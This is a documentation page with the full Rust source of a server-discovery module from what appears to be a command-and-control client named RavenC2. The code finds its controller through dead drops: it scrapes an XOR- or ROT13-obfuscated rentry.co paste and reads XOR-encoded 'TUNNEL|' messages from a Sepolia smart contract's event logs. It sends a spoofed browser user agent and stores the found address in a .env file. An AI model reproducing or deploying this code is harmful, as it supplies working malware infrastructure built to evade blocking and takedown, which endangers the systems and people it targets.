# discovery

| Field | Value |
|-------|-------|
| **Source** | `src/client_rust/src/discovery.rs` |
| **Lines** | 435 |
| **Cards** | T019-networking, T020-crypto |
| **Role** | Server URL discovery (rentry.co + Sepolia contract) |

## Public API

### `fetch_rentry_url` (line 45)
```rust
pub fn fetch_rentry_url(slug: &str) -> Option<String>
```
Fetch the rentry.co page, scrape HTML, XOR-decode (or ROT13 fallback), extract WebSocket URL.

### `fetch_testnet_ws_url` (line 114)
```rust
pub fn fetch_testnet_ws_url() -> Option<String>
```
Fetch WebSocket URL from the RavenC2 contract on Sepolia via eth_getLogs.
Reads SEPOLIA_RPC_URL, SEPOLIA_CONTRACT_ADDRESS, and XOR_KEY from environment.
Scans contract Message events for the latest TUNNEL|<url> message.

### `load_env` (line 205)
```rust
pub fn load_env(env_path: &PathBuf) -> std::collections::HashMap<String, String>
```
Load .env file from the binary's directory.
Returns a hashmap of key=value pairs.

### `persist_url_to_env` (line 227)
```rust
pub fn persist_url_to_env(env_path: &PathBuf, url: &str)
```
Persist SERVER_ADDRESS back to .env file so it survives restarts.

### `discover_server_url` (line 408)
```rust
pub fn discover_server_url(
```
Discover server URL: check rentry.co first (if RENTRY_SLUG set),
then Sepolia testnet, then fall back to SERVER_ADDRESS from env, then default localhost.

## Internal Functions

- `rot13` — ROT13 decode a string (only ASCII letters are shifted) (line 9)
- `strip_html` — Strip HTML tags from a string (line 20)
- `html_unescape` — Unescape common HTML entities (line 35)
- `xor_decode` — XOR decode a hex string using the provided key bytes. (line 96)
- `rot13_roundtrip` (line 261)
- `rot13_known_value_hello` (line 267)
- `rot13_known_value_uppercase` (line 272)
- `rot13_non_alpha_unchanged` (line 277)
- `rot13_mixed_case_roundtrip` (line 283)
- `strip_html_removes_simple_tag` (line 291)
- `strip_html_removes_nested_tags` (line 296)
- `strip_html_plain_text_unchanged` (line 301)
- `strip_html_removes_self_closing_tag` (line 306)
- `strip_html_preserves_text_between_multiple_tags` (line 311)
- `html_unescape_ampersand` (line 318)
- `html_unescape_lt_gt` (line 323)
- `html_unescape_quot_and_apos` (line 328)
- `html_unescape_nbsp` (line 333)
- `html_unescape_no_entities_unchanged` (line 338)
- `load_env_parses_key_value` (line 346)
- `load_env_ignores_comments` (line 359)
- `load_env_ignores_empty_lines` (line 372)
- `load_env_returns_empty_on_missing_file` (line 386)
- `load_env_value_with_equals_sign` (line 393)

## Key Dependencies

- `use tracing::{info, warn};`
- `use super::*;`

## Full Source

```rust
// Server URL discovery from rentry.co + .env fallback
// Reads RENTRY_SLUG from .env, fetches https://rentry.co/{slug},
// extracts <article> content, ROT13-decodes it, finds ws:/wss: line.

use std::path::PathBuf;
use tracing::{info, warn};

/// ROT13 decode a string (only ASCII letters are shifted)
fn rot13(s: &str) -> String {
    s.chars()
        .map(|c| match c {
            'a'..='m' | 'A'..='M' => (c as u8 + 13) as char,
            'n'..='z' | 'N'..='Z' => (c as u8 - 13) as char,
            _ => c,
        })
        .collect()
}

/// Strip HTML tags from a string
fn strip_html(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut in_tag = false;
    for c in s.chars() {
        match c {
            '<' => in_tag = true,
            '>' => in_tag = false,
            _ if !in_tag => out.push(c),
            _ => {}
        }
    }
    out
}

/// Unescape common HTML entities
fn html_unescape(s: &str) -> String {
    s.replace("&amp;", "&")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
        .replace("&nbsp;", " ")
}

/// Fetch the rentry.co page, scrape HTML, XOR-decode (or ROT13 fallback), extract WebSocket URL.
pub fn fetch_rentry_url(slug: &str) -> Option<String> {
    let url = format!("https://rentry.co/{}", slug);
    info!("Checking rentry.co/{} for server URL...", slug);

    let client = reqwest::blocking::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .timeout(std::time::Duration::from_secs(10))
        .build()
        .ok()?;

    let resp = client.get(&url).send().ok()?;
    let body = resp.text().ok()?;

    let art_re = regex::Regex::new(r"(?si)<article[^>]*>(.*?)</article>").ok()?;
    let art_cap = art_re.captures(&body)?;
    let article_html = &art_cap[1];

    let block_re = regex::Regex::new(r"(?i)</p>|</div>|</li>|<br\s*/?>").ok()?;
    let spaced = block_re.replace_all(article_html, "\n");
    let raw = html_unescape(&strip_html(&spaced)).trim().to_string();

    // Try XOR decode first if we have a key
    let xor_key_hex = std::env::var("XOR_KEY").unwrap_or_default();
    if xor_key_hex.len() >= 2 {
        let xor_key: Vec<u8> = (0..xor_key_hex.len() / 2)
            .filter_map(|i| u8::from_str_radix(&xor_key_hex[i * 2..i * 2 + 2], 16).ok())
            .collect();
        if !xor_key.is_empty() {
            if let Some(decoded) = xor_decode(&raw, &xor_key) {
                let ws_re = regex::Regex::new(r"(?i)(wss?://\S+)").ok()?;
                if let Some(cap) = ws_re.captures(&decoded) {
                    let url = cap[1].trim().to_string();
                    info!("Discovered URL from rentry.co/{} (XOR): {}", slug, url);
                    return Some(url);
                }
            }
        }
    }

    // Fallback: ROT13
    let decoded = rot13(&raw);
    let ws_re = regex::Regex::new(r"(?i)ws:\s*(wss?://\S+)").ok()?;
    if let Some(cap) = ws_re.captures(&decoded) {
        let url = cap[1].trim().to_string();
        info!("Discovered URL from rentry.co/{} (ROT13): {}", slug, url);
        return Some(url);
    }
    None
}

/// XOR decode a hex string using the provided key bytes.
fn xor_decode(hex_str: &str, key: &[u8]) -> Option<String> {
    let data: Vec<u8> = (0..hex_str.len() / 2)
        .filter_map(|i| u8::from_str_radix(&hex_str[i * 2..i * 2 + 2], 16).ok())
        .collect();
    if data.len() != hex_str.len() / 2 {
        return None;
    }
    let decoded: Vec<u8> = data
        .iter()
        .enumerate()
        .map(|(i, b)| b ^ key[i % key.len()])
        .collect();
    String::from_utf8(decoded).ok()
}

/// Fetch WebSocket URL from the RavenC2 contract on Sepolia via eth_getLogs.
/// Reads SEPOLIA_RPC_URL, SEPOLIA_CONTRACT_ADDRESS, and XOR_KEY from environment.
/// Scans contract Message events for the latest TUNNEL|<url> message.
pub fn fetch_testnet_ws_url() -> Option<String> {
    let rpc_url = std::env::var("SEPOLIA_RPC_URL").ok()?;
    let contract_address = std::env::var("SEPOLIA_CONTRACT_ADDRESS").ok()?;
    if rpc_url.is_empty() || contract_address.is_empty() {
        return None;
    }

    let xor_key_hex = std::env::var("XOR_KEY").unwrap_or_default();
    let xor_key: Vec<u8> = if xor_key_hex.len() >= 2 {
        (0..xor_key_hex.len() / 2)
            .filter_map(|i| u8::from_str_radix(&xor_key_hex[i * 2..i * 2 + 2], 16).ok())
            .collect()
    } else {
        vec![]
    };

    info!("Checking Sepolia contract {} for tunnel URL...", contract_address);

    let client = reqwest::blocking::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .timeout(std::time::Duration::from_secs(10))
        .build()
        .ok()?;

    // Get current block number to scan last 10000 blocks
    let bn_body = serde_json::json!({
        "jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": 1
    }).to_string();
    let bn_resp = client.post(&rpc_url)
        .header("Content-Type", "application/json")
        .body(bn_body).send().ok()?;
    let bn_json: serde_json::Value = serde_json::from_str(&bn_resp.text().ok()?).ok()?;
    let current_block = i64::from_str_radix(
        bn_json["result"].as_str()?.trim_start_matches("0x"), 16
    ).ok()?;
    let from_block = format!("0x{:x}", (current_block - 10000).max(0));

    // Message(uint256 indexed id, address indexed sender, bytes data)
    let event_topic = "0xafb4ccb78f1474d274fbc1448b20a17655e2da57d1dd99bb0aa2e5adcb4e80df";

    let body = serde_json::json!({
        "jsonrpc": "2.0",
        "method": "eth_getLogs",
        "params": [{"address": contract_address, "fromBlock": from_block, "toBlock": "latest", "topics": [event_topic]}],
        "id": 2
    }).to_string();

    let resp = client.post(&rpc_url)
        .header("Content-Type", "application/json")
        .body(body).send().ok()?;
    let json: serde_json::Value = serde_json::from_str(&resp.text().ok()?).ok()?;
    let logs = json["result"].as_array()?;

    // Scan logs in reverse (newest first) looking for TUNNEL| messages
    for log in logs.iter().rev() {
        let raw_data_hex = log["data"].as_str().unwrap_or("0x").trim_start_matches("0x");
        if raw_data_hex.len() < 128 { continue; }

        // ABI-decode bytes: offset(32) + length(32) + data
        let data_len = usize::from_str_radix(&raw_data_hex[64..128], 16).ok().unwrap_or(0);
        if data_len == 0 || raw_data_hex.len() < 128 + data_len * 2 { continue; }
        let content_hex = &raw_data_hex[128..128 + data_len * 2];

        // Try XOR decode if we have a key
        let text = if !xor_key.is_empty() {
            xor_decode(content_hex, &xor_key)
        } else {
            // Try raw UTF-8
            let bytes: Vec<u8> = (0..data_len)
                .filter_map(|i| u8::from_str_radix(&content_hex[i * 2..i * 2 + 2], 16).ok())
                .collect();
            String::from_utf8(bytes).ok()
        };

        if let Some(text) = text {
            if let Some(url) = text.strip_prefix("TUNNEL|") {
                let url = url.trim().to_string();
                if url.starts_with("wss://") || url.starts_with("ws://") {
                    info!("Discovered URL from Sepolia contract: {}", url);
                    return Some(url);
                }
            }
        }
    }

    warn!("No TUNNEL message found in contract logs");
    None
}

/// Load .env file from the binary's directory.
/// Returns a hashmap of key=value pairs.
pub fn load_env(env_path: &PathBuf) -> std::collections::HashMap<String, String> {
    let mut map = std::collections::HashMap::new();
    if let Ok(content) = std::fs::read_to_string(env_path) {
        for line in content.lines() {
            let line = line.trim();
            if line.is_empty() || line.starts_with('#') {
                continue;
            }
            if let Some(pos) = line.find('=') {
                let k = line[..pos]
                    .trim_start_matches('\u{feff}')
                    .trim()
                    .to_string();
                let v = line[pos + 1..].trim().to_string();
                map.insert(k, v);
            }
        }
    }
    map
}

/// Persist SERVER_ADDRESS back to .env file so it survives restarts.
pub fn persist_url_to_env(env_path: &PathBuf, url: &str) {
    if let Ok(content) = std::fs::read_to_string(env_path) {
        let re = regex::Regex::new(r"(?m)^SERVER_ADDRESS=.*$").unwrap();
        let replacement = format!("SERVER_ADDRESS={}", url);
        let new_content = if re.is_match(&content) {
            re.replace(&content, replacement.as_str())
                .to_string()
        } else {
            format!("{}\nSERVER_ADDRESS={}\n", content.trim_end(), url)
        };
        if new_content != content {
            if let Err(e) = std::fs::write(env_path, &new_content) {
                warn!("Failed to persist SERVER_ADDRESS to .env: {}", e);
            } else {
                info!("Persisted SERVER_ADDRESS to .env: {}", url);
            }
        }
    } else {
        // Create minimal .env
        let _ = std::fs::write(env_path, format!("SERVER_ADDRESS={}\n", url));
        info!("Created .env with SERVER_ADDRESS: {}", url);
    }
}

// ── Tests ────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    // ── rot13 ────────────────────────────────────────────────────────

    #[test]
    fn rot13_roundtrip() {
        let original = "Hello, World! 1234";
        assert_eq!(rot13(&rot13(original)), original);
    }

    #[test]
    fn rot13_known_value_hello() {
        assert_eq!(rot13("hello"), "uryyb");
    }

    #[test]
    fn rot13_known_value_uppercase() {
        assert_eq!(rot13("HELLO"), "URYYB");
    }

    #[test]
    fn rot13_non_alpha_unchanged() {
        let s = "12345!@#$%";
        assert_eq!(rot13(s), s);
    }

    #[test]
    fn rot13_mixed_case_roundtrip() {
        let s = "ThE QuIcK BrOwN FoX";
        assert_eq!(rot13(&rot13(s)), s);
    }

    // ── strip_html ───────────────────────────────────────────────────

    #[test]
    fn strip_html_removes_simple_tag() {
        assert_eq!(strip_html("<b>hello</b>"), "hello");
    }

    #[test]
    fn strip_html_removes_nested_tags() {
        assert_eq!(strip_html("<div><p>text</p></div>"), "text");
    }

    #[test]
    fn strip_html_plain_text_unchanged() {
        assert_eq!(strip_html("no tags here"), "no tags here");
    }

    #[test]
    fn strip_html_removes_self_closing_tag() {
        assert_eq!(strip_html("line1<br/>line2"), "line1line2");
    }

    #[test]
    fn strip_html_preserves_text_between_multiple_tags() {
        assert_eq!(strip_html("<a>foo</a> <b>bar</b>"), "foo bar");
    }

    // ── html_unescape ────────────────────────────────────────────────

    #[test]
    fn html_unescape_ampersand() {
        assert_eq!(html_unescape("a &amp; b"), "a & b");
    }

    #[test]
    fn html_unescape_lt_gt() {
        assert_eq!(html_unescape("&lt;tag&gt;"), "<tag>");
    }

    #[test]
    fn html_unescape_quot_and_apos() {
        assert_eq!(html_unescape("&quot;it&#39;s&quot;"), "\"it's\"");
    }

    #[test]
    fn html_unescape_nbsp() {
        assert_eq!(html_unescape("a&nbsp;b"), "a b");
    }

    #[test]
    fn html_unescape_no_entities_unchanged() {
        let s = "plain text without entities";
        assert_eq!(html_unescape(s), s);
    }

    // ── load_env ─────────────────────────────────────────────────────

    #[test]
    fn load_env_parses_key_value() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join(".env");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, "FOO=bar").unwrap();
        writeln!(f, "BAZ=qux").unwrap();

        let map = load_env(&path);
        assert_eq!(map.get("FOO").map(String::as_str), Some("bar"));
        assert_eq!(map.get("BAZ").map(String::as_str), Some("qux"));
    }

    #[test]
    fn load_env_ignores_comments() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join(".env");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, "# this is a comment").unwrap();
        writeln!(f, "KEY=value").unwrap();

        let map = load_env(&path);
        assert!(!map.contains_key("# this is a comment"));
        assert_eq!(map.get("KEY").map(String::as_str), Some("value"));
    }

    #[test]
    fn load_env_ignores_empty_lines() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join(".env");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, "").unwrap();
        writeln!(f, "   ").unwrap();
        writeln!(f, "ONLY=this").unwrap();

        let map = load_env(&path);
        assert_eq!(map.len(), 1);
        assert_eq!(map.get("ONLY").map(String::as_str), Some("this"));
    }

    #[test]
    fn load_env_returns_empty_on_missing_file() {
        let path = std::path::PathBuf::from("/tmp/does_not_exist_raven_test.env");
        let map = load_env(&path);
        assert!(map.is_empty());
    }

    #[test]
    fn load_env_value_with_equals_sign() {
        // Value may contain '=' (e.g. base64 or URLs)
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join(".env");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, "TOKEN=abc=def==").unwrap();

        let map = load_env(&path);
        // Only split on first '=' per the implementation
        assert_eq!(map.get("TOKEN").map(String::as_str), Some("abc=def=="));
    }
}

/// Discover server URL: check rentry.co first (if RENTRY_SLUG set),
/// then Sepolia testnet, then fall back to SERVER_ADDRESS from env, then default localhost.
pub fn discover_server_url(
    rentry_slug: Option<&str>,
    env_address: Option<&str>,
) -> String {
    // 1. Try rentry.co if we have a slug
    if let Some(slug) = rentry_slug {
        if !slug.is_empty() {
            if let Some(url) = fetch_rentry_url(slug) {
                return url;
            }
            warn!("rentry.co check failed, trying Sepolia testnet...");
        }
    }

    // 2. Try Sepolia testnet
    if let Some(url) = fetch_testnet_ws_url() {
        return url;
    }

    // 3. Return .env URL or default
    if let Some(addr) = env_address {
        if !addr.is_empty() {
            return addr.to_string();
        }
    }

    "ws://localhost:5001/ws/client".to_string()
}

```